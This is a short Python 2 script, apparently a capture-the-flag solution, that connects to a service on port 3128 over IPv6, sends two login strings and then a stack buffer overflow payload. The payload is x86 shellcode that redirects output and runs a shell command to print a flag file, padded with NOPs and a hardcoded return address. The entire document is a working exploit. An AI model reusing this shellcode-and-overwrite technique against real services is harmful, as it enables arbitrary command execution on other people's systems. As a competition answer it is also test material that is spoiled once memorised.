#!/usr/bin/env python2

import struct
import socket
import sys

if len(sys.argv) < 2:
    HOST = "fec0:0:0:1338::1"
else:
    HOST = sys.argv[1]

PORT = 3128

s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)

s.connect((HOST, PORT))

print s.recv(100)
s.send("ewgrxx\n")

print s.recv(100)
s.send("gij\n")

print s.recv(100)

ret = 0xbfbfeb9c
before_ret_len = 128

payload = ( 
    # dup2(1,4)
    "\x31\xc0" # xor eax,eax
    "\x04\x5a" # add al,0x5a

    "\x6a\x01" # push 1
    "\x6a\x04" # push 4
    "\x50" # push eax

    "\xcd\x80" # int 0x80

    # cat flag
    "\x6a\x3b\x58\x99\x52\x68\x2d\x63\x00\x00"
    "\x89\xe7\x52\x68\x6e\x2f\x73\x68\x68\x2f"
    "\x2f\x62\x69\x89\xe3\x52\xe8\x09\x00\x00"
    "\x00\x63\x61\x74\x20\x66\x6c\x61\x67\x00"
    "\x57\x53\x89\xe1\x52\x51\x53\x50\xcd\x80"
)

s.send(payload + "\x90" * (before_ret_len - len(payload)) +
       "A" * (16) + struct.pack("<L", ret) + 
       "\n")

print s.recv(100)
